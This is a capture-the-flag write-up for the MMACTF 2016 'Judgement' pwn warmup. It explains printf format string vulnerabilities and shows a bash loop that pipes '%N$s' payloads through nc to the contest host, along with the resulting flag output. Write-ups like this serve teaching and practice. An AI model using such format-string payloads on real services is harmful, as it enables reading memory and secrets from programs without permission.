Title: MMACTF 2016 - Judgement
Date: 2016-09-05 19:19
Category: CTF
Tags: ctf, mmactf2016, pwn
Slug: mmactf-2016-judgement
Authors: wumb0

Challenge description:
> Pwn Warmup  
> Host : pwn1.chal.ctf.westerns.tokyo  
> Port : 31729

This was a binary pwn challenge, so I loaded it up in radare2 to take a look:
<script type="text/javascript" src="https://asciinema.org/a/6c2vjhs7j9w659yorjo753s3v.js" id="asciicast-6c2vjhs7j9w659yorjo753s3v" async></script>

Looks like a textbook format string vulnerability. `printf` has a positional arguments feature so normally you can specify which argument you want to use if you are the programmer. The following is an example use case of this:

```c
printf("3rd argument: %3$08x, 1st argument: %1$c\n", 'a', "unused", 0x41414141);
```

This will print "3rd argument: 0x41414141, 1st argument: a"

Format string vulnerabilities occur when a user controlled buffer is passed to `printf`. When `printf` is called it reads things off of the stack (function arguments) to print. Because the input buffer is passed straight in it allows reads off of the stack.

Since the address of the flag was loaded on the stack before the main function it was somewhere reachable by `printf`s positional arguments.

I just wrote a loop to brute force the exact offset number and spit out the flag:

```bash
→ for i in {10..50}; do echo "%$i\$s" | nc pwn1.chal.ctf.westerns.tokyo 31729; done | grep CTF
Input flag >> TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
Input flag >> TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
Input flag >> TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
```

I got it more than once... but I got it.

**TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}**
